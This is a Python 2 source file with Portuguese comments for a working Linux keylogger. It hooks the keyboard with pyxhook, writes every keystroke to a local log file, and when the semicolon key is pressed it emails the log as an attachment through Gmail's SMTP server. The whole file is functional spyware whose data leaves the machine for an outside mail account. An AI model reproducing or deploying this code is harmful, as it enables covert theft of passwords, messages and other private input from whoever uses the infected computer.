#lib importantes
#-*- coding: utf-8 -*-
import pyxhook
import datetime,os
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
from email.Utils import COMMASPACE, formatdate

#essa funão gerencia cria os heards dentre outras coisas 
def envia_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[""]):
  global saida
  servidor = servidor
  porta = porta
  FROM = FROM
  PASS = PASS
  TO = TO
  subject = subject
  texto = texto
  msg = MIMEMultipart()
  msg['From'] = FROM
  msg['To'] = TO
  msg['Subject'] = subject
  msg.attach(MIMEText(texto))

  for f in anexo:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(f, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition','attachment;filename="%s"'% os.path.basename(f))
    msg.attach(part)

  try:
    gm = smtplib.SMTP(servidor,porta)
    gm.ehlo()
    gm.starttls()
    gm.ehlo()
    gm.login(FROM, PASS)
    gm.sendmail(FROM, TO, msg.as_string())
    gm.close()

  except Exception,e:
    errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
    print('%s'%errorMsg)

data_hora = datetime.datetime.now()
data_hora = str(data_hora).split('.')[0].replace(' ','_')

destinatario = '' #para onde você ira enviar o arquivo
assunto = 'Keylogger teste %s' %data_hora
mensagem = 'teste do meu Keylogger %s'%data_hora #mensagem é também pega a data é a hora do pc 

servidor= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros

porta = 587

remetente = '' #o seu email 
senha = '' #a sua senha 
log_file = "/home/mrtrue/log.txt" # o local na onde o arquivo sera salvo 

def OnKeyPress(event): #essa função pega as teclas que foram precionadas
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==59: #59 se esse valor e representado por ; se for precionada ele ira parar o keylogger e ira mandar o email
    fob.close()
    new_hook.cancel()
    envia_email(servidor, porta, remetente, senha, destinatario, assunto, mensagem,["/home/mrtrue/log.txt"])

new_hook = pyxhook.HookManager()
new_hook.KeyDown= OnKeyPress
new_hook.HookKeyboard()
new_hook.start()